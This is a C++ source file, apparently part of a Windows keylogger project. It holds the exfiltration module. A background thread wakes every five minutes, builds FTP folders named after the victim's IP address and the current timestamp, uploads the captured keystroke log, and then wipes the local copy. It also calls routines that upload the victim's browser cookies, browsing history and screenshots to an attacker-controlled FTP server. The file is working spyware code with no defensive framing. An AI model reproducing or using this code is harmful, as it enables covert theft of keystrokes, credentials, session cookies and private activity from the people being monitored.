#include "Keylogger.h"

int sendDirectory(const char* directoryName)
{
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	int err = 0;

	if (hInternet == NULL)
	{
		std::cout << "Err hInternet" << std::endl;
		return 1;
	}
	HINTERNET hFtpSession = InternetConnect(hInternet, FTP_HOST, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);

	if (hFtpSession == NULL)
	{
		std::cout << "Err hFtpSession" << std::endl;
		InternetCloseHandle(hInternet);
		return 1;
	}

	if (!FtpCreateDirectoryA(hFtpSession, directoryName))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
			err = 1;
	}

	InternetCloseHandle(hFtpSession);
	InternetCloseHandle(hInternet);
	return (err);
}

int sendFile(const char * pathToFile, const char * targetFtpFile)
{
	HINTERNET hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	int err = 0;

	if (hInternet == NULL)
		return 1;
	HINTERNET hFtpSession = InternetConnect(hInternet, FTP_HOST, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	if (hFtpSession == NULL)
	{
		InternetCloseHandle(hInternet);
		return 1;
	}
	
	if (!FtpPutFileA(hFtpSession, pathToFile, targetFtpFile, FTP_TRANSFER_TYPE_BINARY, 0))
		err = 1;

	InternetCloseHandle(hFtpSession);
	InternetCloseHandle(hInternet);
	return (err);
}

int uploadKeyboardFile(std::string targetBase, std::string directoryName, std::string TargetPath)
{
	
	std::string keyboardPath = TargetPath + "/keyboard.txt";
	if (sendDirectory(targetBase.c_str()) == 0 && sendDirectory(directoryName.c_str()) == 0 && sendDirectory(TargetPath.c_str()) == 0 && sendFile(winkey_g.pathFile.c_str(), keyboardPath.c_str()) == 0)
	{
		std::ofstream file(winkey_g.pathFile, std::ios::trunc);
		file.close();
		return (0);
	}

	std::cout << "Failed to uplaod\n";
	return (1);
}

void threadUpload()
{
	while (winkey_g.running)
	{
		std::cout << "uploading..." << std::endl;
		std::string targetBase = "/" + winkey_g.targetIP;
		std::string directoryName = targetBase + "/" + getTime("%d_%m_%Y");
		std::string TargetPath = directoryName + "/" + getTime("%H_%M_%S");
	
		if (uploadKeyboardFile(targetBase, directoryName, TargetPath) == 0)
		{
			uploadCookies(TargetPath);
		 	uploadHistory(TargetPath);
			uploadScreenShot(TargetPath);
		}
		std::this_thread::sleep_for(std::chrono::seconds(300));
	}
}